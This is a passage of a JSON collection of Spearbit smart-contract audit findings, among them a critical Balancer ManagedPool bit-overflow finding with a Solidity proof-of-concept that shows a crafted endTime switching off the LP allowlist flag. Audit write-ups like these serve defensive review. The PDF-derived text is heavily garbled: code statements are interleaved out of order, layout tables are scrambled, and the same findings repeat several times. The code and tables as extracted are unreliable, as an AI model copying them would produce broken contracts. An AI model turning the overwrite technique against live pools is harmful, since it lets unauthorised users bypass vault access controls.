        "body": "The comment preStateClaim for the leftmost leaf of each execution trace subgame. in FaultDisputeGame.sol incorrectly describes the condition for determining 18  s index at depth is 0, the prestate is the absolute // If the step position // prestate. // If the step is an attack at a trace index > 0, the prestate exists elsewhere in // the game state. // NOTE: We localize the // // // preStateClaim = (stepPos.indexAtDepth() % (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH))) == 0 ? ABSOLUTE_PRESTATE : _findTraceAncestor(Position.wrap(parentPos.raw() - 1), parent.parentIndex, false).claim; the remainder of the index at depth divided by 2 ** (MAX_GAME_DEPTH - SPLIT_DEPTH), which is the number of leaves in each execution trace subgame. This is so that we can determine whether or not the step position is represents the for the current execution trace subgame by finding ABSOLUTE_PRESTATE indexAtDepth .     The correct calculation for the number of leaves in the execution trace trees should be: (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH - 1)) The execution trace roots are located at SPLIT_DEPTH + 1, making the current calculation (1 << (MAX_GAME_- DEPTH - SPLIT_DEPTH)) double the actual number of leaf nodes. However, the stepPos here is already one level below the MAX_GAME_DEPTH at MAX_GAME_DEPTH + 1. The current implementation works correctly because the stepPos in an attack case is double the parentPos. // gindex of nextStep in attack scenario stepPos = parentPos * 2; Therefore, the left and right side of the modulo operator will be double the amount and compute the correct result in the modulo equals zero case. Example: For MAX_GAME_DEPTH = 4 and SPLIT_DEPTH = 2:  Correct number of leaves: 2 ** (4-2-1) = 2 and not 4.  Current implementation works correctly because (x % 2) == (2x % 4) holds true if x % 2 == 0. General Form x mod y = (2x) mod (2y) The condition holds true if and only if x mod y = 0.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 64 bits | 32 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "AeraVault constructor is not checking all the input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault constructor has the role to handle Balancers ManagedPool deployment. The con- structor should increase the number of user input validation and the Gauntlet team should be aware of the possible edge case that could happen given that the deployment of the Aera Vault is handled directly by the Treasury and not by the Gauntlet team itself. We are going to list all the worst-case scenarios that could happen given the premise that the deployments are handled by the Treasury. 1. factory could be a wrapper contract that will deploy a ManagedPool. This would mean that the deployer could pass correct parameters to Aera Vault to pass these checks, but will use custom and malicious parameters on the factory wrapper to deploy the real Balancer pool. 2. swapFeePercentage value is not checked. On Balancer, the deployment will revert if the value is not in- side this range >= 1e12 (0.0001%) and <= 1e17 (10% - this fits in 64 bits). Without any check, the Gauntlet accept to follow the Balancers swap requirements. 3. manager_ is not checked. They could set the manager as the Treasury (owner of the vault) itself. This would give the Treasury the full power to manage the Vault. At least these values should be checked: address(0), address(this) or owner(). The same checks should also be done in the setManager() function. 4. validator_ could be set to a custom contract that will give full allowances to the Treasury. This would make the withdraw() act like finalize() allowing to withdraw all the funds from the vault/pool. 17 5. noticePeriod_ has only a max value check. Gauntlet team explained that a time delay between the ini- tialization of the finalize process and the actual finalize is needed to prevent the Treasury to be able to instantly withdraw all the funds. Not having a min value check allow the Treasury to set the value to 0 so there would be no delay between the initiateFinalization() and finalize() because noticeTimeoutAt == block.timestamp. 6. managementFee_ has no minimum value check. This would allow the Treasury to not pay the manager because the managerFeeIndex would always be 0. 7. description_ can be empty. From the Specification PDF, the description of the vault has the role to De- scribes vault purpose and modelling assumptions for differentiating between vaults. Being empty could lead to a bad UX for external services that needs to differentiate different vaults. These are all the checks that are done directly by Balancer during deployment via the Pool Factory:  BasePool constructor#L94-L95 min and max number of tokens.  BasePool constructor#L102token array is sorted following Balancer specification (sorted by token address).  BasePool constructor calling _setSwapFeePercentage min and max value for swapFeePercentage.  BasePool constructor calling vault.registerTokens token address uniqueness (cant have same Following the pathBasePool is calling from function _registerMinimalSwapInfoPoolTokens it also checks that token != IERC20(0). should that call token in the pool), vault.registerTokens MinimalSwapInfoPoolsBalance.  ManagedPool constructor calling _startGradualWeightChange Check min value of weight and that the total sum of the weights are equal to 100%. _startGradualWeightChange internally check that endWeight >= WeightedMath._MIN_WEIGHT and normalizedSum == FixedPoint.ONE.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Duplicated functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: { } uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; } { if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences and similarities of ConsiderationDecoder and solc when decoding dynamic arrays of static/fixed base struct type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The way OfferItem[] in abi_decode_dyn_array_OfferItem and ConsiderationItem[] in abi_- decode_dyn_array_ConsiderationItem are decoded are consistent with solc regarding this:  For dynamic arrays of static/fixed base struct type, the memory region looks like: 63 [mPtrLength --------------------------------------------------- [mPtrLength + 0x20: mPtrLength + 0x40) : mPtrLength + 0x20) arrLength memberTail1 - a memory pointer to the array's 1st element ,! ... [mPtrLength + ...: mPtrLength + ...) memberTailN - a memory pointer to the array's Nth element ,! --------------------------------------------------- [memberTail1 ... [memberTailN : memberTail1 + <STRUCT_SIZE>) element1 : memberTailN + <STRUCT_SIZE>) elementN The difference is solc decodes and validates (checking dirty bytes) each field of the elements of the array (which are static struct types) separately (one calldataload and validation per field per element). ConsiderationDecoder skips all those validations for both OfferItems[] and ConsiderationItems[] by copying a chunk of calldata to memory (the tail parts): calldatacopy( mPtrTail, add(cdPtrLength, 0x20), mul(arrLength, OfferItem_size) ) That means for OfferItem[], itemType and token (and also recipient for ConsiderationItem[]) fields can potentially have dirty bytes.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit 1 bit | | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Duplicated functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: { } uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; { } if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 127 max-line-length max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit | // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", 